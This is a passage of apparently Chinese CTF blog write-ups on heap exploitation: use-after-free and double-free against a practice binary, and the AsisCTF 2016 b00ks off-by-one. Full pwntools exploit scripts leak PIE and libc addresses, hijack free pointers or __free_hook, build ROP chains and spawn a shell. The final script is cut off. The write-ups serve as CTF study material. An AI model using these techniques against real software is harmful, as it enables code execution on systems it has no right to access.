alt="image-20230307152831940" style="zoom:67%;"><h3 id="using-after-free"><a href="#using-after-free" class="headerlink" title="using after free"></a>using after free</h3><p>我们先creat 两个string ，这样共申请了2个0x32大小的chunk，再先释放1再释放0会进入tcache bins</p><p><code>tchche bin    string0------&gt;string1</code></p><p>这时候我们在申请一块小于0x28大小的chunk(空间复用会导致比原来可以多8个字节，也就是chunk head的prev size)</p><p>这样我们的结构体会分到string0地址，context会分到string 1地址，string1地址里的free函数还在里面，而且还在全局结构数组里，可以控制该指针为任意函数</p><p>这样我们下次再delete(0)可以把两个chunk再次释放</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D6C</span><span class="params">(<span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次申请就又可以和之前一样，再次delete（1）循环利用</p><p><img src="/2023/03/04/Using-After-Free/image-20230307163539833.png" alt="image-20230307163539833"></p><h4 id="覆盖为call-puts，泄露pie基址"><a href="#覆盖为call-puts，泄露pie基址" class="headerlink" title="覆盖为call puts，泄露pie基址"></a>覆盖为call puts，泄露pie基址</h4><p>payload&#x3D;b’a’*24+b’\x1a’<br>create(len(payload),payload)</p><h4 id="覆盖为printf，利用格式化字符串漏洞"><a href="#覆盖为printf，利用格式化字符串漏洞" class="headerlink" title="覆盖为printf，利用格式化字符串漏洞"></a>覆盖为printf，利用格式化字符串漏洞</h4><p>利用pie基址，泄露libc即可</p><p>payload&#x3D;b’a’*4+b’%15$p’.ljust(20,b’b’)+p64(printf_plt)<br>create(len(payload),payload)<br>delete(1)<br>ru(b’a’*4)<br>_IO_file_write&#x3D;int(r(14),16)-45<br>p(‘_IO_file_write’,_IO_file_write)</p><h4 id="覆盖为system"><a href="#覆盖为system" class="headerlink" title="覆盖为system"></a>覆盖为system</h4><p>拿到shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230307174939515.png" alt="image-20230307174939515"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_2_1_stdout_=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">base=_IO_2_1_stdout_-libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;sh;&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;1&#x27;</span>)+p64(system)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面这种方法不知道为什么在高版本glibc下拿不到shell，这里我们再delete是发现会在栈上输入，这样我也可以构造rop链来拿到shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230308005837886.png" alt="image-20230308005837886"></p><p>我们需要输入yes占8个字节绕过strncmp，然后四个pop到后面ret的地址，进行rop</p><p><img src="/2023/03/04/Using-After-Free/image-20230308011254973.png" alt="image-20230308011254973"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%15$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_file_write=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">45</span></span><br><span class="line">p(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">base=_IO_file_write-libc.dump(<span class="string">&#x27;_IO_file_write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pop4=pie+<span class="number">0x00000000000011dc</span></span><br><span class="line">rdi=<span class="number">0x00000000000011e3</span>+pie</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop4)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;delete\nid:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload= <span class="string">b&quot;yesaaaaa&quot;</span> + p64(rdi) + p64(bin_sh) + p64(<span class="number">0x949</span>+pie)+p64(system)</span><br><span class="line">sla(<span class="string">&quot;sure?:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>我们还可以利用都变了free来做free函数调用hook</p><p>如果我们先申请两个string chunk</p><p>create(5,b’hello’)<br>create(5,b’grxer’)</p><p>再释放</p><p>delete(0)<br>delete(1)<br>delete(0)</p><p>这样我们的fastbin会在0和1直接有一个回环链表</p><p><img src="/2023/03/04/Using-After-Free/image-20230308124636807.png" alt="image-20230308124636807"></p><p>我们再次</p><p>create(4, b’fsf’)<br>create(0x20, b’a’ * 0x16 + b’lo’ + b’\x2d\x00’)</p><p>第一个create会申请到第一个string堆块，第二个creat会申请到第二个string堆块，和第一个string堆块作为context存储区，而我们的第一个creat会把该块当作自己的struct，这样就可以控制它的free指针，改写为puts指针输出puts地址，找到基址</p><p><img src="/2023/03/04/Using-After-Free/image-20230308125210074.png" alt="image-20230308125210074"></p><p>我们再次delete(1),再次申请一个context大于0xf&lt;&#x3D;0x28的chunk即可循环利用</p><h4 id="exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"><a href="#exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以" class="headerlink" title="exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"></a>exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&#x27;fsf&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Using After Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFF-BY-ONE AsisCTF2016b00ks</title>
      <link href="/2023/03/02/AsisCTF2016b00ks-OBO/"/>
      <url>/2023/03/02/AsisCTF2016b00ks-OBO/</url>
      
        <content type="html"><![CDATA[<h1 id="AsisCTF-2016-b00ks-OFF-BY-ONE"><a href="#AsisCTF-2016-b00ks-OFF-BY-ONE" class="headerlink" title="AsisCTF-2016-b00ks OFF-BY-ONE"></a>AsisCTF-2016-b00ks OFF-BY-ONE</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p><p>__free_hook and off by one</p><span id="more"></span><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302015134670.png" alt="image-20230302015134670"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012924030.png" alt="image-20230302012924030"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302010143341.png" alt="image-20230302010143341"></p><p>有漏洞会多读取一个字节的&#x2F;x00</p><p>author name存放在unk_202040+pie处，32个字节</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302011350558.png" alt="image-20230302011350558"></p><p>分析后可以推断出book结构体是如下的，而且在unk_202060+pie处开始存放结构体指针，我们可以进行一个字节的溢出，来控制book1的最低位地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">void</span> * book_name;</span><br><span class="line"><span class="type">void</span> *book_description;</span><br><span class="line"><span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字节对齐后最终占到32字节</span></span><br></pre></td></tr></table></figure><h3 id="泄露book1地址"><a href="#泄露book1地址" class="headerlink" title="泄露book1地址"></a>泄露book1地址</h3><p>输入32个字节name再打印就可以泄露</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012108199.png" alt="image-20230302012108199"></p><h3 id="实现可控"><a href="#实现可控" class="headerlink" title="实现可控"></a>实现可控</h3><p>我们再次修改another——name会再次把0x2060处覆盖为0，也就是说我们book1的结构体地址往低地址走了，而我们malloc的时候顺序是 book_name–&gt;book_description–&gt;book_struct</p><p>所有我们可以通过计算把book1地址变为book_description(具体为申请一个较大的description，有利于我们book1落在上面，通过对bookname控制调整可以准确落在什么)，我们的description可以再次修改，我们可以在book1的des伪造一个book结构体，如果说我们把伪造结构体的des改为book2的description地址，我们就可以通过修改1的des为想要读写地址，再通过</p><p>book2的des进行修改和读取</p><h3 id="读写什么"><a href="#读写什么" class="headerlink" title="读写什么"></a>读写什么</h3><p>开启了FULL RELRO，不能改写got表，程序中用到了free和malloc函数，我们可以打free_hook，将free 函数hook为system，description修改为binsh地址，这样我们free(description)就可以拿到shell，要拿到__free_hook地址我们还需要泄露libc的基址，我们可以利用malloc申请大内存，这样malloc就会调用mmap直接映射一块内存给我们，</p><p>这块内存和libc的基地址是固定的，我们可以泄露des地址，通过减去固定偏移得到libc基址</p><p>create_book(0x21000, “two”, 0x21000, “twodes”)</p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302020528381.png" alt="image-20230302020528381" style="zoom: 67%;"><p>得到偏移，0x7f3100400000-0x7f31003bc010&#x3D;0x43FF0</p><p>这里偏移还需要把aslr关掉，不关闭会随机化，试了一下libc2.35会随机，2.23不会，远程的话可能要利用bins去泄露动态地址</p><blockquote><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space </p><ul><li>0 &#x3D; 关闭</li><li>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 &#x3D; 全随机。除了1中所述，还有heap。</li><li>ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</li></ul></blockquote><p>由于我们第二次申请的内存都过大，都采用vmmap，所以malloc book2时之后第一个book1地址间隔0x30（数据大小0x20+chunk_head(0x10)）</p><p>伪造book1，payload&#x3D;p64(1) + p64(book_two_ad + 8)+p64(book_two_ad+16)+ p64(140)</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302022645243.png" alt="image-20230302022645243"></p><p>布置好之后，free</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302141959390.png" alt="image-20230302141959390"></p><p>本来是要拿到shell的可是2.35libc已经删除hook，可以看到free汇编里已经没有了，检测hook</p><p>换上libc2.23的机器重新计算偏移，拿到shell</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302152118170.png" alt="image-20230302152118170"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE15)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, book_name, desc_size, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params">book_id, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>, name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line">input_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">32</span>+<span class="number">0x20</span>+<span class="number">0x90</span>,<span class="string">&#x27;one&#x27;</span>,<span class="number">140</span>,<span 